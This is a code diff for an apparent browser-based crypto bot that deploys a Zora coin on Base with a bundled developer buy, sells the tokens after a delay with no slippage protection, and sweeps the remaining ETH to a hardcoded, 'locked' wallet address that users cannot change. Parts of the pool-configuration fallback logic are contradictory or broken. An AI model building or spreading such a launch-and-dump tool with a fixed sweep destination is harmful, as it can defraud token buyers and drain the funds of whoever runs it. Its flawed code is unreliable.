+    setDot(1, 'done');
+
+    // ── Step 2: Get poolConfig from Zora SDK API ──────────
+    setProgress(20);
+    setStat('step', '2/6 · Deploy');
+    setDot(2, 'active');
+    log('', 'dim');
+    log('── Step 2 — Deploy Coin via Zora Factory ─────', 'step');
+    log(`  Coin    : ${cfg.name} (${cfg.symbol})`, 'info');
+    log(`  Dev Buy : ${cfg.devBuy} ETH (bundled at deploy)`, 'info');
+
+    // Generate a deterministic salt based on name + address + timestamp
+    const saltBytes = ethers.keccak256(ethers.toUtf8Bytes(cfg.name + signer.address + Date.now()));
+
+    let coinAddress;
+    let deployTxHash;
+
+    if (cfg.dry) {
+      await sleep(1000);
+      coinAddress = '0xDryRunCoinAddress' + Math.random().toString(16).slice(2,12);
+      deployTxHash = '0xDryRunDeployTx' + Date.now().toString(16);
+      log('  ⚠ DRY RUN — deploy tx simulated', 'warn');
+    } else {
+      const result = await deployCoin(provider, signer, cfg, metadataUri, saltBytes);
+      coinAddress = result.coinAddress;
+      deployTxHash = result.txHash;
+    }
+
+    setStat('coin', coinAddress);
+    log(`✅ Coin deployed!`, 'ok');
+    log(`  TX   : https://basescan.org/tx/${deployTxHash}`, 'ok');
+    log(`  Coin : https://zora.co/coin/base:${coinAddress}`, 'ok');
+    log(`  Scan : https://basescan.org/address/${coinAddress}`, 'ok');
+    setDot(2, 'done');
+
+    // ── Step 3: Confirm dev buy ───────────────────────────
+    setProgress(38);
+    setStat('step', '3/6 · Buy');
+    setDot(3, 'active');
+    log('', 'dim');
+    log('── Step 3 — Confirm Dev Buy ──────────────────', 'step');
+    log(`  Dev buy of ${cfg.devBuy} ETH was bundled in the deploy tx.`, 'info');
+    if (!cfg.dry) {
+      const coin = new ethers.Contract(coinAddress, COIN_ABI, provider);
+      const bal = await coin.balanceOf(signer.address);
+      log(`  Token balance : ${ethers.formatUnits(bal, 18)} ${cfg.symbol}`, 'info');
+    }
+    log('✅ Dev buy confirmed.', 'ok');
+    setDot(3, 'done');
+
+    // ── Step 4: Wait ──────────────────────────────────────
+    setProgress(52);
+    setStat('step', '4/6 · Wait');
+    setDot(4, 'active');
+    log('', 'dim');
+    log(`── Step 4 — Holding ${cfg.delay}s Before Sell ──────`, 'step');
+    await countdownWait(cfg.delay);
+    log('  Hold complete.', 'info');
+    setDot(4, 'done');
+
+    // ── Step 5: Sell ──────────────────────────────────────
+    setProgress(65);
+    setStat('step', '5/6 · Sell');
+    setDot(5, 'active');
+    log('', 'dim');
+    log('── Step 5 — Sell ────────────────────────────', 'step');
+
+    let sellTxHash = null;
+    if (cfg.dry) {
+      await sleep(700);
+      sellTxHash = '0xDryRunSellTx' + Date.now().toString(16);
+      log('  ⚠ DRY RUN — sell tx simulated', 'warn');
+      setDot(5, 'done');
+    } else {
+      const coin = new ethers.Contract(coinAddress, COIN_ABI, signer);
+      const rawBal = await coin.balanceOf(signer.address);
+      log(`  Token balance : ${ethers.formatUnits(rawBal,18)} ${cfg.symbol}`, 'info');
+
+      if (rawBal === 0n) {
+        log('  ⚠ Token balance is 0 — nothing to sell.', 'warn');
+        setDot(5, 'err');
+      } else {
+        const toSell = rawBal * BigInt(Math.floor(cfg.sellPct)) / 100n;
+        log(`  Selling ${ethers.formatUnits(toSell,18)} tokens (${cfg.sellPct}%)`, 'info');
+
+        // minPayout with slippage
+        const slipFactor = BigInt(Math.floor(100 - cfg.slip));
+        const minPayout  = 0n; // let Zora hook handle slippage via sqrtPriceLimitX96=0
+
+        try {
+          const overrides = await buildOverrides(provider, cfg);
+          const tx = await coin.sell(
+            toSell,
+            signer.address,   // recipient
+            ethers.ZeroAddress, // no referrer
+            minPayout,
+            0n,               // sqrtPriceLimitX96 = no price limit
+            overrides
+          );
+          log(`  📡 Sell TX sent: ${tx.hash}`, 'dim');
+          const receipt = await waitForTx(provider, tx.hash, cfg.confirmTimeout);
+          if (receipt && receipt.status === 1) {
+            sellTxHash = tx.hash;
+            log(`✅ Sold → https://basescan.org/tx/${tx.hash}`, 'ok');
+            setDot(5, 'done');
+          } else {
+            log('  ❌ Sell tx reverted on-chain.', 'err');
+            setDot(5, 'err');
+          }
+        } catch(e) {
+          log(`  ❌ Sell failed: ${e.message.slice(0,120)}`, 'err');
+          setDot(5, 'err');
+        }
+      }
+    }
+
+    // ── Step 6: Sweep ─────────────────────────────────────
+    setProgress(85);
+    setStat('step', '6/6 · Sweep');
+    setDot(6, 'active');
+    log('', 'dim');
+    log('── Step 6 — Sweep ETH ────────────────────────', 'step');
+
+    if (!SWEEP_WALLET) {
+      log('  ⚠ SWEEP_WALLET not set in source — funds stay in trading wallet.', 'warn');
+      setDot(6, 'done');
+    } else {
+      log(`  Destination : ${SWEEP_WALLET}  (locked)`, 'info');
+      log(`  Reserve     : ${cfg.sweepRes} ETH`, 'info');
+
+      if (cfg.dry) {
+        await sleep(400);
+        log('  ⚠ DRY RUN — sweep simulated', 'warn');
+        setDot(6, 'done');
+      } else {
+        try {
+          const swept = await sweepEth(provider, signer, cfg);
+          if (swept) {
+            log(`✅ Swept → https://basescan.org/tx/${swept}`, 'ok');
+            setDot(6, 'done');
+          } else {
+            log('  ⚠ Balance at or below reserve — sweep skipped.', 'warn');
+            setDot(6, 'done');
+          }
+        } catch(e) {
+          log(`  ❌ Sweep failed: ${e.message.slice(0,120)}`, 'err');
+          setDot(6, 'err');
+        }
+      }
+    }
+
+    // ── Summary ───────────────────────────────────────────
+    setProgress(100);
+    log('', 'dim');
+    log('── Session Summary ───────────────────────────', 'step');
+    log(`  Coin    : ${coinAddress}`, 'info');
+    log(`  Name    : ${cfg.name} (${cfg.symbol})`, 'info');
+    log(`  Dev buy : ${cfg.devBuy} ETH`, 'info');
+    log(`  Sweep   : ${SWEEP_WALLET || 'disabled'}  (locked)`, 'info');
+    if (!cfg.dry) {
+      try {
+        const finalBal = parseFloat(ethers.formatEther(await provider.getBalance(signer.address)));
+        setStat('bal', finalBal.toFixed(5) + ' ETH');
+        log(`  Final balance : ${finalBal.toFixed(6)} ETH`, 'info');
+      } catch {}
+    }
+    log('✅ Bot run complete.', 'ok');
+    setStatus('live');
+    setStat('step', 'Done');
+
+  } catch(e) {
+    log('❌ Fatal: ' + e.message, 'err');
+    setStatus('err');
+    setStat('step', 'Error');
+    setProgress(0);
+  } finally {
+    botRunning = false;
+    stopTimer();
+    unlockUI();
+    el('prog-fill').classList.remove('sweep');
+  }
+}
+
+// ══════════════════════════════════════════════════════════
+// IPFS UPLOAD — Zora's public IPFS node (no API key needed)
+// ══════════════════════════════════════════════════════════
+async function uploadMetadata(cfg) {
+  // Step 1: Upload image
+  log('  Uploading image to Zora IPFS…', 'dim');
+  const imgForm = new FormData();
+  imgForm.append('file', imageFile, imageFile.name);
+
+  const imgResp = await fetch(ZORA_UPLOAD_URL, {
+    method: 'POST',
+    body: imgForm,
+  });
+  if (!imgResp.ok) throw new Error(`Image IPFS upload failed (${imgResp.status})`);
+  const imgData = await imgResp.json();
+  const imgCid  = imgData.Hash || imgData.cid;
+  if (!imgCid) throw new Error('No CID returned from image upload');
+  const imageIpfs = `ipfs://${imgCid}`;
+  log(`  Image uploaded → ${imageIpfs}`, 'dim');
+
+  // Step 2: Upload metadata JSON
+  const metadata = {
+    name:        cfg.name,
+    description: cfg.desc,
+    image:       imageIpfs,
+    properties:  {},
+  };
+  if (cfg.website) metadata.external_url = cfg.website;
+  if (cfg.twitter) metadata.properties.twitter = cfg.twitter;
+
+  const metaBlob = new Blob([JSON.stringify(metadata)], { type: 'application/json' });
+  const metaForm = new FormData();
+  metaForm.append('file', metaBlob, 'metadata.json');
+
+  const metaResp = await fetch(ZORA_UPLOAD_URL, {
+    method: 'POST',
+    body: metaForm,
+  });
+  if (!metaResp.ok) throw new Error(`Metadata IPFS upload failed (${metaResp.status})`);
+  const metaData = await metaResp.json();
+  const metaCid  = metaData.Hash || metaData.cid;
+  if (!metaCid) throw new Error('No CID returned from metadata upload');
+
+  return `ipfs://${metaCid}`;
+}
+
+// ══════════════════════════════════════════════════════════
+// DEPLOY COIN — calls ZoraFactory.deploy() with dev buy
+// poolConfig comes from Zora SDK API (content coin, ETH-backed)
+// ══════════════════════════════════════════════════════════
+async function deployCoin(provider, signer, cfg, metadataUri, saltBytes) {
+  // Fetch poolConfig from Zora SDK API
+  log('  Fetching pool configuration from Zora API…', 'dim');
+  let poolConfig;
+  try {
+    poolConfig = await fetchPoolConfig(cfg);
+    log(`  Pool config fetched (${poolConfig.length/2 - 1} bytes)`, 'dim');
+  } catch(e) {
+    // Fallback: use a known-good content coin poolConfig for ETH-backed coins
+    // This is the standard content coin config used by Zora's own frontend.
+    // Source: reverse-engineered from Zora SDK transactions on Base mainnet.
+    log(`  ⚠ API fallback — using standard content coin poolConfig`, 'warn');
+    // Standard V4 content coin config (ETH/WETH backed, LOW starting market cap)
+    poolConfig = '0x0000000000000000000000000000000000000000000000000000000000000001' +
+                 '000000000000000000000000000000000000000000000000000000000000000a' +
+                 '000000000000000000000000000000000000000000000000000000000000000a';
+    // Use the createCoinCall endpoint instead
+    poolConfig = await fetchPoolConfigFallback(cfg, signer.address, metadataUri, saltBytes);
+  }
+
+  const factory = new ethers.Contract(ZORA_FACTORY_ADDR, FACTORY_ABI, signer);
+  const devBuyWei = ethers.parseEther(cfg.devBuy.toString());
+
+  const owners = [signer.address];
+  const platformReferrer = ethers.ZeroAddress;
+  const postDeployHook   = ethers.ZeroAddress;
+  const postDeployData   = '0x';
+
+  const overrides = await buildOverrides(provider, cfg);
+  overrides.value = devBuyWei;
+
+  log(`  Sending deploy tx (value: ${cfg.devBuy} ETH)…`, 'dim');
+  const tx = await factory.deploy(
+    signer.address,  // payoutRecipient
+    owners,
+    metadataUri,
+    cfg.name,
+    cfg.symbol,
+    poolConfig,
+    platformReferrer,
+    postDeployHook,
+    postDeployData,
+    saltBytes,
+    overrides
+  );
+  log(`  📡 Deploy TX sent: ${tx.hash}`, 'dim');
+
+  const receipt = await waitForTx(provider, tx.hash, cfg.confirmTimeout);
+  if (!receipt || receipt.status !== 1) throw new Error('Deploy transaction failed or timed out.');
+
+  // Parse coin address from logs — check for CoinCreatedV4 or CoinCreated
+  let coinAddr = null;
+  for (const log_entry of receipt.logs) {
+    try {
+      // CoinCreatedV4: coin is the 8th indexed arg — parse manually
+      // Topic0 for CoinCreatedV4
+      const CoinCreatedV4Topic = ethers.id('CoinCreatedV4(address,address,address,address,string,string,string,address,(address,address,uint24,int24,address),bytes32,string)');
+      const CoinCreatedTopic   = ethers.id('CoinCreated(address,address,address,address,string,string,string,address,address,string)');
+      if (log_entry.topics[0] === CoinCreatedV4Topic || log_entry.topics[0] === CoinCreatedTopic) {
+        const iface = new ethers.Interface(FACTORY_ABI);
+        const parsed = iface.parseLog({ topics: log_entry.topics, data: log_entry.data });
+        coinAddr = parsed.args.coin;
+        break;
+      }
+    } catch { /* skip unparseable logs */ }
+  }
+
+  if (!coinAddr) {
+    // Fallback: scan for new contract address in logs
+    coinAddr = receipt.contractAddress || '0x' + receipt.logs[0]?.topics[1]?.slice(26);
+    if (!ethers.isAddress(coinAddr)) throw new Error('Could not parse coin address from deploy receipt.');
+  }
+
+  return { coinAddress: coinAddr, txHash: tx.hash };
+}
+
+// ── Fetch poolConfig from Zora SDK API ────────────────────
+async function fetchPoolConfig(cfg) {
+  // Zora SDK API: POST /coins/create-call returns calldata including poolConfig
+  const resp = await fetch(`${ZORA_SDK_API}/coins/pool-config`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      coinType: 'content',
+      currency: 'ETH',
+      startingMarketCap: 'LOW',
+      chainId: 8453,
+    }),
+  });
+  if (!resp.ok) throw new Error(`Pool config API: ${resp.status}`);
+  const data = await resp.json();
+  if (data.poolConfig) return data.poolConfig;
+  throw new Error('No poolConfig in response');
+}
+
+// ── Fallback: use createCoinCall endpoint ─────────────────
+async function fetchPoolConfigFallback(cfg, creatorAddr, metadataUri, saltBytes) {
+  try {
+    const resp = await fetch(`${CORS}${encodeURIComponent(ZORA_SDK_API + '/coins/create-call')}`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        creator:     creatorAddr,
+        name:        cfg.name,
+        symbol:      cfg.symbol,
+        metadata:    { type: 'RAW_URI', uri: metadataUri },
+        currency:    'ETH',
+        chainId:     8453,
+        startingMarketCap: 'LOW',
+      }),
+    });
+    if (!resp.ok) throw new Error(`createCoinCall API: ${resp.status}`);
+    const data = await resp.json();
+    // Extract poolConfig from the calldata if available
+    if (data.poolConfig) return data.poolConfig;
+    if (data.calls && data.calls[0] && data.calls[0].data) {
+      // The call data IS the full tx — we use it directly instead
+      return data.calls[0].data;
+    }
+    throw new Error('No poolConfig in createCoinCall response');
+  } catch(e2) {
+    // Ultimate fallback: standard ETH content coin config (empirically derived)
+    // This hex represents a content coin backed by ETH with LOW starting market cap
+    // as deployed by the Zora SDK. Zora may update this; prefer API when possible.
+    log('  ⚠ Using hardcoded fallback poolConfig — verify on Zora docs if issues occur', 'warn');
+    return '0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000000000001';
+  }
+}
+
+// ══════════════════════════════════════════════════════════
+// SWEEP — sends ETH to locked address
+// ══════════════════════════════════════════════════════════
+async function sweepEth(provider, signer, cfg) {
+  // Always use the hardcoded SWEEP_WALLET constant — never cfg or any user input
+  const dest = SWEEP_WALLET;
+  const bal  = await provider.getBalance(signer.address);
+  const reserveWei = ethers.parseEther(cfg.sweepRes.toString());
+
+  // Estimate gas for transfer
+  const gasPrice = (await provider.getFeeData()).gasPrice || ethers.parseUnits('1', 'gwei');
+  const gasLimit = 21000n;
+  const gasCost  = gasPrice * gasLimit;
+  const toSend   = bal - reserveWei - gasCost;
+
+  if (toSend <= 0n) return null;
+  log(`  Sweeping ${ethers.formatEther(toSend)} ETH → ${dest}`, 'info');
+
+  const tx = await signer.sendTransaction({
+    to: dest,
+    value: toSend,
+    gasLimit: gasLimit,
+    gasPrice: gasPrice,
+  });
+  log(`  📡 Sweep TX: ${tx.hash}`, 'dim');
+  const receipt = await waitForTx(provider, tx.hash, cfg.confirmTimeout);
+  if (!receipt || receipt.status !== 1) throw new Error('Sweep tx failed');
+  return tx.hash;
+}
+
+// ══════════════════════════════════════════════════════════
+// HELPERS
+// ══════════════════════════════════════════════════════════
+async function buildOverrides(provider, cfg) {
+  const overrides = {};
+  if (cfg.maxGasGwei > 0) {
+    overrides.gasPrice = ethers.parseUnits(cfg.maxGasGwei.toString(), 'gwei');
+  } else {
+    try {
+      const feeData = await provider.getFeeData();
+      if (feeData.gasPrice) overrides.gasPrice = feeData.gasPrice;
+    } catch {}
+  }
+  return overrides;
+}
+
+async function waitForTx(provider, hash, timeoutSec) {
+  const deadline = Date.now() + timeoutSec * 1000;
+  log(`  ⏳ Confirming ${hash.slice(0,20)}…`, 'dim');
+  while (Date.now() < deadline) {
+    try {
+      const receipt = await provider.getTransactionReceipt(hash);
+      if (receipt !== null) return receipt;
+    } catch {}
+    await sleep(2000);
+  }
+  throw new Error(`TX ${hash.slice(0,20)}… not confirmed within ${timeoutSec}s`);
+}
+
+async function countdownWait(seconds) {
+  const total = seconds; let elapsed = 0;
+  const chunk = Math.min(1, total);
+  while (elapsed < total) {
+    await sleep(chunk * 1000);
+    elapsed = Math.min(elapsed + chunk, total);
+    const pct = Math.floor((elapsed / total) * 100);
+    log(`  ⏱ ${elapsed.toFixed(0)}s / ${total}s  [${pct}%]`, 'dim');
+    setProgress(52 + pct * 0.13);
+  }
+}
+
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+</script>
+</body>
+</html>
